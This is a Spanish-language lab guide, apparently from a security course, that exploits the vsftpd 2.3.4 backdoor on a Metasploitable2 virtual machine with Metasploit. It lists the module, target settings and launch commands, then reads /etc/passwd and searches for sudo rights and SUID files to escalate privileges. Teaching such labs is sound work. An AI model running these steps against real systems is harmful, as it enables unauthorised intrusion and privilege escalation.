# Práctica 04.- 🛠 Práctica 04: Fase de Explotación con Metasploit
Luis ha identificado una vulnerabilidad en el servidor FTP vsftpd 2.3.4 que se ejecuta en el puerto TCP/21 de la máquina Metasploitable2. Ahora, usaremos Metasploit para explotar esta vulnerabilidad y obtener acceso a la máquina víctima.

## 1️⃣ Información sobre la Vulnerabilidad
El servidor vsftpd 2.3.4 tiene una vulnerabilidad que permite obtener una shell remota en el sistema. Esta vulnerabilidad se encuentra en la versión comprometida de vsftpd y se activa al intentar iniciar sesión con un usuario que contenga :) en el nombre.

Exploit disponible en Metasploit: exploit/unix/ftp/vsftpd_234_backdoor

## 2️⃣ Iniciar Metasploit en Kali Linux
Abrimos una terminal y ejecutamos:

```bash
msfconsole
```
Esperamos a que se cargue Metasploit Framework.

## 3️⃣ Buscar y Seleccionar el Exploit
Buscamos el exploit correspondiente:

```bash
search vsftpd
```
El resultado mostrará algo similar a:

```bash
exploit/unix/ftp/vsftpd_234_backdoor
```
Seleccionamos el exploit:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```
## 4️⃣ Configurar los Parámetros del Exploit
### 1️⃣ Definir la IP de la máquina víctima (Metasploitable2):

```bash
set RHOSTS 10.0.2.15
```
(Asegúrate de reemplazar 10.0.2.15 con la IP real de la máquina víctima obtenida en la fase de escaneo.)

### 2️⃣ Definir el puerto del servicio FTP (TCP/21):

```bash
set RPORT 21
```
### 5️⃣ Ejecutar el Exploit
Iniciar la explotación con:

```bash
exploit
```
Si todo funciona correctamente, obtendremos una shell remota con acceso al sistema.

### 6️⃣ Validar el Acceso
Si el exploit es exitoso, deberíamos ver algo como:

```nginx
Command shell session opened - 10.0.2.15:21
```
Ahora podemos ejecutar comandos en la máquina víctima, por ejemplo:

```bash
whoami
uname -a
cat /etc/passwd
```
### 7️⃣ Elevar Privilegios (Opcional)
Si queremos obtener acceso root, podemos intentar técnicas de escalada de privilegios, como:

```bash
sudo -l
```
O buscar archivos con permisos mal configurados:

```bash
find / -perm -4000 2>/dev/null
```
### 8️⃣ Cerrar la Sesión
Si queremos salir de la sesión, escribimos:

```bash
exit
```
Y luego cerramos Metasploit con:

```bash
exit
```